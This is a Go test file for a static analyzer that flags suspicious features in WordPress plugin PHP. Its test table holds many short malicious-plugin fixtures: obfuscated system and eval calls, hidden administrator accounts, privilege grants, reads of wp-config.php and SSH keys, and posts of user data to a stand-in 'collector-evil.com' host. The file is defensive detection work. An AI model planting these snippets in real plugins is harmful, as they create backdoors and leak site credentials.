// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package analyze

import (
	"slices"
	"strings"
	"testing"

	"github.com/RhythmShahriar/sightread/core"
)

func phpFeatures(src string) []core.Feature {
	return codeFeatures(langPHP, "plugin/x.php", []byte(src), core.CtxCode)
}

// featureCase is one row of a feature table: src must (want) or must
// not (!want) give a feature of kind with key ("*" for any key) whose
// attrs include attrs.
type featureCase struct {
	name  string
	src   string
	kind  core.FeatureKind
	key   string
	attrs map[string]string
	want  bool
}

func matchFeature(fs []core.Feature, kind core.FeatureKind, key string, attrs map[string]string) bool {
	for _, f := range fs {
		if f.Kind != kind || (key != "*" && f.Key != key) {
			continue
		}
		ok := true
		for k, v := range attrs {
			if f.Attrs[k] != v {
				ok = false
			}
		}
		if ok {
			return true
		}
	}
	return false
}

func describe(fs []core.Feature) []string {
	var out []string
	for _, f := range fs {
		d := f.SetKey()
		var as []string
		for k, v := range f.Attrs {
			as = append(as, k+"="+v)
		}
		slices.Sort(as)
		if len(as) > 0 {
			d += " {" + strings.Join(as, " ") + "}"
		}
		out = append(out, d)
	}
	return out
}

func runFeatureCases(t *testing.T, l lang, cases []featureCase) {
	t.Helper()
	counts := map[core.FeatureKind][2]int{}
	for _, tc := range cases {
		c := counts[tc.kind]
		if tc.want {
			c[0]++
		} else {
			c[1]++
		}
		counts[tc.kind] = c
		t.Run(string(tc.kind)+"/"+tc.name, func(t *testing.T) {
			fs := codeFeatures(l, "plugin/x", []byte(tc.src), core.CtxCode)
			if got := matchFeature(fs, tc.kind, tc.key, tc.attrs); got != tc.want {
				t.Errorf("feature %s:%s %v present = %v, want %v\nfeatures: %q", tc.kind, tc.key, tc.attrs, got, tc.want, describe(fs))
			}
		})
	}
	for k, c := range counts {
		if c[0] < 3 || c[1] < 3 {
			t.Errorf("%s has %d positive and %d negative cases, want at least 3 of each", k, c[0], c[1])
		}
	}
}

func TestPHPFeatures(t *testing.T) {
	runFeatureCases(t, langPHP, []featureCase{
		// FCall: the watch list.
		{"system", `<?php system($cmd);`, core.FCall, "system", nil, true},
		{"built system", `<?php $f = 'sys'.'tem'; $f('ls');`, core.FCall, "system", nil, true},
		{"error_reporting 0", `<?php error_reporting(0);`, core.FCall, "error_reporting", map[string]string{"arg0": "0"}, true},
		{"preg_replace e", `<?php preg_replace('/x/e', $r, $s);`, core.FCall, "preg_replace", nil, true},
		{"curl family", `<?php $c = curl_init('https://api.example.com/');`, core.FCall, "curl_init", map[string]string{"arg0": "https://api.example.com/"}, true},
		{"add_cap method", `<?php $r = get_role('editor'); $r->add_cap('edit_x');`, core.FCall, "add_cap", nil, true},
		{"error_reporting all", `<?php error_reporting(E_ALL);`, core.FCall, "error_reporting", nil, false},
		{"preg_replace plain", `<?php preg_replace('/x/i', 'y', $s);`, core.FCall, "preg_replace", nil, false},
		{"system in a comment", "<?php // system($x);\n/* system($y); */", core.FCall, "system", nil, false},
		{"system in a string", `<?php echo 'system($x)';`, core.FCall, "system", nil, false},
		{"system method", `<?php $o->system('x');`, core.FCall, "system", nil, false},

		// FUserCreate.
		{"insert admin", `<?php wp_insert_user(array('user_login' => 'x', 'user_pass' => $p, 'role' => 'administrator'));`,
			core.FUserCreate, "wp_insert_user", map[string]string{"role": "administrator"}, true},
		{"insert built role", `<?php $u = array('user_login' => 'x'); $u['role'] = 'admin' . 'istrator'; wp_insert_user($u);`,
			core.FUserCreate, "wp_insert_user", map[string]string{"role": "administrator"}, true},
		{"set_role admin", `<?php $user = new WP_User($id); $user->set_role('administrator');`,
			core.FUserCreate, "set_role", map[string]string{"role": "administrator"}, true},
		{"grant_super_admin", `<?php grant_super_admin($id);`, core.FUserCreate, "grant_super_admin", nil, true},
		{"capabilities meta", `<?php update_user_meta($id, $wpdb->prefix . 'capabilities', array('administrator' => true));`,
			core.FUserCreate, "wp_capabilities", map[string]string{"role": "administrator"}, true},
		{"wpdb capabilities", `<?php $wpdb->insert($wpdb->usermeta, array('meta_key' => 'wp_capabilities', 'meta_value' => 'a:1:{s:13:"administrator";b:1;}'));`,
			core.FUserCreate, "wp_capabilities", map[string]string{"role": "administrator"}, true},
		{"update without role", `<?php wp_update_user(array('ID' => 1, 'display_name' => 'x'));`, core.FUserCreate, "*", nil, false},
		{"set_role subscriber", `<?php $user->set_role('subscriber');`, core.FUserCreate, "set_role", map[string]string{"role": "administrator"}, false},
		{"lookup only", `<?php $u = get_user_by('login', 'admin');`, core.FUserCreate, "*", nil, false},
		{"commented insert", `<?php // wp_insert_user(array('role' => 'administrator'));`, core.FUserCreate, "*", nil, false},

		// FUserHide.
		{"where rewrite", `<?php add_action('pre_user_query', function ($q) { global $wpdb; $q->query_where .= " AND {$wpdb->users}.user_login != 'ghost'"; });`,
			core.FUserHide, "pre_user_query", nil, true},
		{"views count rewrite", `<?php add_filter('views_users', 'hide_count'); function hide_count($views) { $views['all'] = preg_replace('/\(\d+\)/', '(1)', $views['all']); return $views; }`,
			core.FUserHide, "views_users", nil, true},
		{"exclude set", `<?php add_action('pre_get_users', function ($q) { $q->set('exclude', array(7)); });`,
			core.FUserHide, "pre_get_users", nil, true},
		{"method callback", `<?php class H { function __construct() { add_action('pre_user_query', array($this, 'hide')); } function hide($q) { $q->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND ID<>7", $q->query_where); } }`,
			core.FUserHide, "pre_user_query", nil, true},
		{"adds a view", `<?php add_filter('views_users', function ($v) { $v['mine'] = '<a href="#">Mine</a>'; return $v; });`,
			core.FUserHide, "*", nil, false},
		{"orders only", `<?php add_action('pre_user_query', function ($q) { $q->query_orderby = 'ORDER BY ID'; });`,
			core.FUserHide, "*", nil, false},
		{"other hook", `<?php add_action('init', function ($q) { $q->query_where .= ' x'; });`, core.FUserHide, "*", nil, false},

		// FCap.
		{"subscriber gets manage_options", `<?php $role = get_role('subscriber'); $role->add_cap('manage_options');`,
			core.FCap, "add_cap:subscriber:manage_options", nil, true},
		{"chained get_role", `<?php get_role('editor')->add_cap('install_plugins');`, core.FCap, "add_cap:editor:install_plugins", nil, true},
		{"user_has_cap filter", `<?php add_filter('user_has_cap', 'grant_all', 10, 3);`, core.FCap, "cap:filter:user_has_cap", nil, true},
		{"add_role caps", `<?php add_role('shop_boss', 'Boss', array('read' => true, 'manage_options' => true));`,
			core.FCap, "add_cap:shop_boss:manage_options", map[string]string{"via": "add_role"}, true},
		{"wp_roles", `<?php $wp_roles->add_cap('author', 'edit_users');`, core.FCap, "add_cap:author:edit_users", nil, true},
		{"remove_cap", `<?php get_role('administrator')->remove_cap('edit_plugins');`, core.FCap, "remove_cap:administrator:edit_plugins", nil, true},
		{"check only", `<?php if (current_user_can('manage_options')) { do_it(); }`, core.FCap, "*", nil, false},
		{"other filter", `<?php add_filter('the_content', 'x');`, core.FCap, "*", nil, false},
		{"has_cap", `<?php $user->has_cap('edit_posts');`, core.FCap, "*", nil, false},

		// FRoute.
		{"return true", `<?php register_rest_route('ep/v1', '/run', array('methods' => 'POST', 'callback' => 'ep_run', 'permission_callback' => '__return_true'));`,
			core.FRoute, "ep/v1/run", map[string]string{"permission": "open", "methods": "POST"}, true},
		{"missing permission", `<?php register_rest_route('ep/v1', '/data', array('methods' => 'GET', 'callback' => 'ep_data'));`,
			core.FRoute, "ep/v1/data", map[string]string{"permission": "open"}, true},
		{"closure true", `<?php register_rest_route('ep/v1', '/x', array('callback' => 'f', 'permission_callback' => function () { return true; }));`,
			core.FRoute, "ep/v1/x", map[string]string{"permission": "open"}, true},
		{"one of two endpoints open", `<?php register_rest_route('a/v1', '/y', array(array('callback' => 'f', 'permission_callback' => 'chk'), array('methods' => 'POST', 'callback' => 'g')));`,
			core.FRoute, "a/v1/y", map[string]string{"permission": "open"}, true},
		{"real check", `<?php register_rest_route('ep/v1', '/run', array('callback' => 'f', 'permission_callback' => function () { return current_user_can('manage_options'); }));`,
			core.FRoute, "*", map[string]string{"permission": "open"}, false},
		{"method check", `<?php register_rest_route('ep/v1', '/run', array('callback' => array($this, 'run'), 'permission_callback' => array($this, 'check')));`,
			core.FRoute, "*", map[string]string{"permission": "open"}, false},
		{"args variable", `<?php $args = array('callback' => 'f', 'permission_callback' => 'chk'); register_rest_route('a/v1', '/b', $args);`,
			core.FRoute, "*", map[string]string{"permission": "open"}, false},

		// FCron.
		{"schedule event", `<?php wp_schedule_event(time(), 'hourly', 'ep_ping');`, core.FCron, "ep_ping", map[string]string{"recurrence": "hourly"}, true},
		{"single event", `<?php wp_schedule_single_event(time() + 60, 'ep_once');`, core.FCron, "ep_once", nil, true},
		{"action scheduler", `<?php as_schedule_recurring_action(time(), 3600, 'ep_as');`, core.FCron, "ep_as", nil, true},
		{"cron_schedules", `<?php add_filter('cron_schedules', function ($s) { $s['minute'] = array('interval' => 60); return $s; });`,
			core.FCron, "cron_schedules", nil, true},
		{"next scheduled", `<?php if (!wp_next_scheduled('ep_ping')) { $x = 1; }`, core.FCron, "*", nil, false},
		{"clear hook", `<?php wp_clear_scheduled_hook('ep_ping');`, core.FCron, "*", nil, false},
		{"commented", `<?php # wp_schedule_event(time(), 'hourly', 'ep_ping');`, core.FCron, "*", nil, false},

		// FWrite: the target classes are in TestPHPWriteTargets.
		{"wp-config", `<?php file_put_contents(ABSPATH . 'wp-config.php', $c);`, core.FWrite, "wp-config", nil, true},
		{"mu-plugin through a variable", `<?php $f = WP_CONTENT_DIR . '/mu-plugins/x.php'; file_put_contents($f, $c);`,
			core.FWrite, "mu-plugins", map[string]string{"ext": ".php"}, true},
		{"htaccess append", `<?php $h = fopen(ABSPATH . '.htaccess', 'a');`, core.FWrite, "htaccess", nil, true},
		{"read mode", `<?php $h = fopen(ABSPATH . '.htaccess', 'r');`, core.FWrite, "*", nil, false},
		{"plain read", `<?php $x = file_get_contents(ABSPATH . 'wp-config.php');`, core.FWrite, "*", nil, false},
		{"fwrite alone", `<?php fwrite($h, $data);`, core.FWrite, "*", nil, false},

		// FUpdateFilter.
		{"hide updates", `<?php add_filter('site_transient_update_plugins', 'hide_updates');`, core.FUpdateFilter, "site_transient_update_plugins", map[string]string{"scope": "all"}, true},
		{"no auto updates", `<?php add_filter('auto_update_plugin', '__return_false');`, core.FUpdateFilter, "auto_update_plugin", map[string]string{"scope": "all", "callback": "__return_false"}, true},
		{"core updates", `<?php add_filter('pre_site_transient_update_core', function () { return null; });`, core.FUpdateFilter, "pre_site_transient_update_core", map[string]string{"scope": "all"}, true},
		{"own entry only", `<?php add_filter('site_transient_update_plugins', function ($t) { unset($t->response[plugin_basename(__FILE__)]); return $t; });`,
			core.FUpdateFilter, "*", map[string]string{"scope": "all"}, false},
		{"own basename in a property", `<?php class P { function __construct() { $this->basename = plugin_basename(__FILE__); add_filter('site_transient_update_plugins', array($this, 'f')); } function f($t) { unset($t->response[$this->basename]); return $t; } }`,
			core.FUpdateFilter, "*", map[string]string{"scope": "all"}, false},
		{"own basename in a constant", `<?php define('MY_BASENAME', plugin_basename(MY_PLUGIN_FILE)); add_filter('site_transient_update_plugins', function ($t) { unset($t->response[MY_BASENAME]); return $t; });`,
			core.FUpdateFilter, "*", map[string]string{"scope": "all"}, false},
		{"another plugin's basename", `<?php add_filter('site_transient_update_plugins', function ($t) { unset($t->response['akismet/akismet.php']); return $t; });`,
			core.FUpdateFilter, "site_transient_update_plugins", map[string]string{"scope": "all"}, true},
		{"a variable named slug", `<?php add_filter('site_transient_update_plugins', function ($t) use ($slug) { unset($t->response[$slug]); return $t; });`,
			core.FUpdateFilter, "site_transient_update_plugins", map[string]string{"scope": "all"}, true},
		{"basename of another path", `<?php add_filter('site_transient_update_plugins', function ($t) { unset($t->response[plugin_basename(WP_PLUGIN_DIR . '/wordfence/wordfence.php')]); return $t; });`,
			core.FUpdateFilter, "site_transient_update_plugins", map[string]string{"scope": "all"}, true},
		{"own and another plugin", `<?php add_filter('site_transient_update_plugins', function ($t) { unset($t->response[plugin_basename(__FILE__)], $t->response['wordfence/wordfence.php']); return $t; });`,
			core.FUpdateFilter, "site_transient_update_plugins", map[string]string{"scope": "all"}, true},
		{"updater adds itself", `<?php add_filter('pre_set_site_transient_update_plugins', array($this, 'check'));`, core.FUpdateFilter, "*", nil, false},
		{"after install", `<?php add_filter('upgrader_post_install', 'x', 10, 3);`, core.FUpdateFilter, "*", nil, false},

		// FUACheck.
		{"crawler fetched", `<?php if (strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false) { echo wp_remote_retrieve_body(wp_remote_get('http://spam.example/x')); }`,
			core.FUACheck, "user-agent", map[string]string{"prints": "fetched"}, true},
		{"crawler encoded via variable", `<?php $ua = $_SERVER['HTTP_USER_AGENT']; if (preg_match('/bot|crawl/i', $ua)) { echo base64_decode($p); }`,
			core.FUACheck, "user-agent", map[string]string{"prints": "encoded"}, true},
		{"logged out fetched", `<?php if (!is_user_logged_in()) { echo file_get_contents('https://spam.example/links'); }`,
			core.FUACheck, "logged-in", map[string]string{"prints": "fetched"}, true},
		{"crawler html", "<?php if (stripos($_SERVER['HTTP_USER_AGENT'], 'bingbot') !== false) : ?>\n<a href=\"x\">x</a>\n<?php endif;",
			core.FUACheck, "user-agent", map[string]string{"prints": "literal"}, true},
		{"mobile check", `<?php if (strpos($_SERVER['HTTP_USER_AGENT'], 'Mobile') !== false) { echo 'm'; }`, core.FUACheck, "*", nil, false},
		{"bot skips stats", `<?php if (stripos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false) { return; }`, core.FUACheck, "*", nil, false},
		{"admin branch", `<?php if (is_admin()) { echo 'x'; }`, core.FUACheck, "*", nil, false},

		// FEnvRead.
		{"aws secret", `<?php $k = getenv('AWS_SECRET_ACCESS_KEY');`, core.FEnvRead, "AWS_SECRET_ACCESS_KEY", nil, true},
		{"github token", `<?php $k = getenv('GITHUB_TOKEN');`, core.FEnvRead, "GITHUB_TOKEN", nil, true},
		{"env array", `<?php $k = $_ENV['DB_PASSWORD'];`, core.FEnvRead, "DB_PASSWORD", nil, true},
		{"whole env", `<?php $all = getenv();`, core.FEnvRead, "*", map[string]string{"fn": "getenv"}, true},
		{"wp env", `<?php $e = getenv('WP_ENV');`, core.FEnvRead, "*", nil, false},
		{"home", `<?php $h = getenv('HOME');`, core.FEnvRead, "*", nil, false},
		{"app env", `<?php $e = $_ENV['APP_ENV'];`, core.FEnvRead, "*", nil, false},

		// FCredRead.
		{"wp-config read", `<?php $c = file_get_contents(ABSPATH . 'wp-config.php');`, core.FCredRead, "wp-config", nil, true},
		{"ssh key", `<?php $k = file(getenv('HOME') . '/.ssh/id_rsa');`, core.FCredRead, "ssh", nil, true},
		{"composer auth via variable", `<?php $p = $home . '/.composer/auth.json'; $a = file_get_contents($p);`, core.FCredRead, "composer-auth", nil, true},
		{"fopen read", `<?php $h = fopen(ABSPATH . 'wp-config.php', 'r');`, core.FCredRead, "wp-config", nil, true},
		{"own config", `<?php $c = file_get_contents(__DIR__ . '/config.json');`, core.FCredRead, "*", nil, false},
		{"remote json", `<?php $c = file_get_contents('https://api.example.com/x.json');`, core.FCredRead, "*", nil, false},
		{"write is not read", `<?php file_put_contents(ABSPATH . 'wp-config.php', $c);`, core.FCredRead, "*", nil, false},

		// FSend.
		{"users posted", `<?php wp_remote_post($u, array('body' => array('users' => get_users())));`, core.FSend, "wp_remote_post", map[string]string{"reads": "users"}, true},
		{"admin email mailed", "<?php function f() {\n$e = get_option('admin_email');\nwp_mail('x@example.com', 's', $e);\n}",
			core.FSend, "wp_mail", map[string]string{"reads": "options,admin_email", "channel": "mail"}, true},
		{"env with curl", "<?php function g($ch) {\n$t = getenv('X');\ncurl_exec($ch);\n}", core.FSend, "curl_exec", map[string]string{"reads": "env"}, true},
		{"plain get", `<?php $r = wp_remote_get('https://api.example.com/v');`, core.FSend, "wp_remote_get", nil, true},
		{"reads in another function", "<?php function a() { return get_users(); }\nfunction b() { wp_remote_post('https://x.example', array()); }",
			core.FSend, "*", map[string]string{"reads": "users"}, false},
		{"commented post", `<?php // wp_remote_post($u, $data);`, core.FSend, "*", nil, false},
		{"literal host", `<?php wp_remote_post('https://collector-evil.com/in', $d);`, core.FSend, "wp_remote_post",
			map[string]string{"host": "collector-evil.com", "domain": "collector-evil.com"}, true},
		{"subdomain host", `<?php wp_remote_get('https://API.acme-plugins.com/v');`, core.FSend, "wp_remote_get",
			map[string]string{"host": "api.acme-plugins.com", "domain": "acme-plugins.com"}, true},
		{"socket host", `<?php $s = stream_socket_client('tcp://203.0.113.9:80');`, core.FSend, "stream_socket_client",
			map[string]string{"host": "203.0.113.9", "channel": "socket"}, true},
		{"host built at run time", `<?php wp_remote_post($u, $d);`, core.FSend, "wp_remote_post", map[string]string{"host": "", "local": ""}, true},
		{"loopback socket", `<?php $s=@fsockopen('127.0.0.1',18905);`, core.FSend, "fsockopen",
			map[string]string{"host": "", "local": "127.0.0.1", "channel": "socket"}, true},
		{"localhost URL", `<?php wp_remote_post('http://LocalHost:8080/in', $d);`, core.FSend, "wp_remote_post",
			map[string]string{"host": "", "local": "localhost"}, true},
		{"reserved name", `<?php wp_remote_get('https://analytics.wpos-cdn.example/v2/p');`, core.FSend, "wp_remote_get",
			map[string]string{"host": "", "local": "analytics.wpos-cdn.example"}, true},
		{"public host is not local", `<?php $s = fsockopen('203.0.113.9', 4444);`, core.FSend, "fsockopen",
			map[string]string{"host": "203.0.113.9", "local": ""}, true},
		{"a URL in the body is not the host", `<?php wp_remote_post($u, array('body' => 'https://other-site.com/x'));`,
			core.FSend, "*", map[string]string{"host": "other-site.com"}, false},
		{"client method", `<?php $http->post($u, $data);`, core.FSend, "*", nil, false},

		// FDynCall.
		{"request callee", `<?php $f = $_GET['f']; $f();`, core.FDynCall, "variable function", map[string]string{"source": "request"}, true},
		{"built callee", `<?php $cb = 'sys' . 'tem'; $cb($x);`, core.FDynCall, "system", map[string]string{"source": "folded"}, true},
		{"call_user_func data", `<?php call_user_func($_POST['cb']);`, core.FDynCall, "call_user_func", map[string]string{"source": "request"}, true},
		{"variable method", `<?php $this->$m();`, core.FDynCall, "variable method", map[string]string{"source": "unknown"}, true},
		{"plain callback", `<?php call_user_func('trim', $x);`, core.FDynCall, "*", nil, false},
		{"plain call", `<?php trim($x);`, core.FDynCall, "*", nil, false},
		{"plain method", `<?php $obj->run();`, core.FDynCall, "*", nil, false},

		// FEval.
		{"eval data", `<?php eval($code);`, core.FEval, "eval", map[string]string{"arg": "dynamic"}, true},
		{"eval decode", `<?php eval(base64_decode($x));`, core.FEval, "eval", map[string]string{"decode": "true"}, true},
		{"assert request", `<?php assert($_GET['x']);`, core.FEval, "assert", map[string]string{"source": "request"}, true},
		{"create_function", `<?php $f = create_function('$a', $_POST['c']);`, core.FEval, "create_function", map[string]string{"source": "request"}, true},
		{"eval through call_user_func", `<?php call_user_func('ev'.'al', $x);`, core.FEval, "eval", map[string]string{"via": "call_user_func"}, true},
		{"assert comparison", `<?php assert($x > 0);`, core.FEval, "*", nil, false},
		{"assert true", `<?php assert(true);`, core.FEval, "*", nil, false},
		{"eval in a comment", `<?php /* eval($x); */`, core.FEval, "*", nil, false},
		{"eval method", `<?php $engine->evaluate($x);`, core.FEval, "*", nil, false},

		// FInclude.
		{"png", `<?php include 'images/icon.png';`, core.FInclude, "images/icon.png", map[string]string{"ext": ".png"}, true},
		{"ico from dir", `<?php require_once __DIR__ . '/assets/favicon.ico';`, core.FInclude, "assets/favicon.ico", map[string]string{"ext": ".ico"}, true},
		{"txt", `<?php include $dir . 'data.txt';`, core.FInclude, "data.txt", map[string]string{"ext": ".txt"}, true},
		{"php", `<?php include 'class-x.php';`, core.FInclude, "*", nil, false},
		{"inc", `<?php require_once __DIR__ . '/inc/x.inc';`, core.FInclude, "*", nil, false},
		{"variable", `<?php include $file;`, core.FInclude, "*", nil, false},

		// FHalt.
		{"halt", "<?php __halt_compiler();\x00\x01data", core.FHalt, "__halt_compiler", nil, true},
		{"halt upper", `<?php echo 1; __HALT_COMPILER() ?>data`, core.FHalt, "__halt_compiler", map[string]string{"trailing": "4"}, true},
		{"halt namespaced", `<?php \__halt_compiler();`, core.FHalt, "__halt_compiler", nil, true},
		{"halt string", `<?php echo '__halt_compiler';`, core.FHalt, "*", nil, false},
		{"halt comment", `<?php // __halt_compiler();`, core.FHalt, "*", nil, false},
		{"halt lookalike", `<?php function __halt_compiler_x() {}`, core.FHalt, "*", nil, false},

		// FHook.
		{"init", `<?php add_action('init', 'x');`, core.FHook, "init", map[string]string{"kind": "action", "callback": "x"}, true},
		{"nopriv ajax", `<?php add_action('wp_ajax_nopriv_ep_run', 'x');`, core.FHook, "wp_ajax_nopriv_ep_run", nil, true},
		{"all_plugins", `<?php add_filter('all_plugins', 'hide');`, core.FHook, "all_plugins", map[string]string{"kind": "filter"}, true},
		{"custom hook", `<?php add_action('my_custom_hook', 'x');`, core.FHook, "*", nil, false},
		{"do_action", `<?php do_action('init');`, core.FHook, "*", nil, false},
		{"unknown hook", `<?php add_action($hook, 'x');`, core.FHook, "*", nil, false},
	})
}

func TestPHPWriteTargets(t *testing.T) {
	tests := []struct{ src, want string }{
		{`file_put_contents(ABSPATH . 'wp-config.php', $c);`, tgtWPConfig},
		{`file_put_contents(ABSPATH . '.htaccess', $c);`, tgtHtaccess},
		{`file_put_contents(WPMU_PLUGIN_DIR . '/a.php', $c);`, tgtMUPlugins},
		{`copy($tmp, WP_PLUGIN_DIR . '/other/x.php');`, tgtPluginsDir},
		{`file_put_contents(ABSPATH . 'x.php', $c);`, tgtABSPath},
		{`file_put_contents(WP_CONTENT_DIR . '/x.php', $c);`, tgtContentDir},
		{`file_put_contents(__DIR__ . '/../../x.php', $c);`, tgtParentDir},
		{`$u = wp_upload_dir(); file_put_contents($u['basedir'] . '/log.txt', $c);`, tgtUploads},
		{`file_put_contents(__DIR__ . '/cache/x.json', $c);`, tgtOwn},
		{`file_put_contents(sys_get_temp_dir() . '/x', $c);`, tgtTemp},
		{`file_put_contents($path, $c);`, tgtUnknown},
		{`rename($a, plugin_dir_path(__FILE__) . 'x.txt');`, tgtOwn},
		{`$wp_filesystem->put_contents(ABSPATH . 'wp-config.php', $c);`, tgtWPConfig},
	}
	for _, tc := range tests {
		fs := phpFeatures("<?php " + tc.src)
		var got []string
		for _, f := range fs {
			if f.Kind == core.FWrite {
				got = append(got, f.Key)
			}
		}
		if len(got) != 1 || got[0] != tc.want {
			t.Errorf("%s: write targets %q, want [%s]", tc.src, got, tc.want)
		}
	}
}

func TestPathContext(t *testing.T) {
	tests := map[string]string{
		"plugin.php":                    core.CtxCode,
		"includes/class-x.php":          core.CtxCode,
		"vendor/guzzle/src/Client.php":  core.CtxVendored,
		"node_modules/a/index.js":       core.CtxVendored,
		"tests/test-x.php":              core.CtxTest,
		"src/__tests__/a.js":            core.CtxTest,
		"docs/api.md":                   core.CtxDoc,
		"readme.txt":                    core.CtxDoc,
		"README.md":                     core.CtxDoc,
		"vendor/x/tests/a.php":          core.CtxVendored,
		"assets/js/admin.js":            core.CtxCode,
		"latest-tests-runner/tests.php": core.CtxCode,
	}
	for p, want := range tests {
		if got := pathContext(p); got != want {
			t.Errorf("pathContext(%q) = %q, want %q", p, got, want)
		}
	}
}

func TestFeatureEvidence(t *testing.T) {
	src := "<?php\nclass Boot {\n\tpublic function run() {\n\t\twp_insert_user(\n\t\t\tarray( 'role' => 'administrator' )\n\t\t);\n\t}\n}\n"
	fs := phpFeatures(src)
	for _, f := range fs {
		if f.Kind != core.FUserCreate {
			continue
		}
		if f.Ev.Path != "plugin/x.php" || f.Ev.Line != 4 || f.Ev.EndLine != 6 || f.Ev.Func != "Boot::run" || f.Context != core.CtxCode {
			t.Errorf("evidence %+v context %q", f.Ev, f.Context)
		}
		if !strings.Contains(f.Ev.Snippet.String(), "wp_insert_user(") {
			t.Errorf("snippet %q", f.Ev.Snippet)
		}
		return
	}
	t.Fatalf("no user-create feature in %q", describe(fs))
}

func TestFeatureSecretsMasked(t *testing.T) {
	key := "sk_" + "live_" + "Fk3sightreadTEST0nly4Fixtures"
	src := "<?php\nwp_remote_post('https://api.example.com/', array('headers' => array('Authorization' => 'Bearer " + key + "')));\n$c = curl_init('" + key + "');\n"
	for _, f := range phpFeatures(src) {
		if strings.Contains(f.Ev.Snippet.String(), key) {
			t.Errorf("%s snippet shows the key: %q", f.SetKey(), f.Ev.Snippet)
		}
		for k, v := range f.Attrs {
			if strings.Contains(v, key) {
				t.Errorf("%s attr %s shows the key: %q", f.SetKey(), k, v)
			}
		}
	}
}
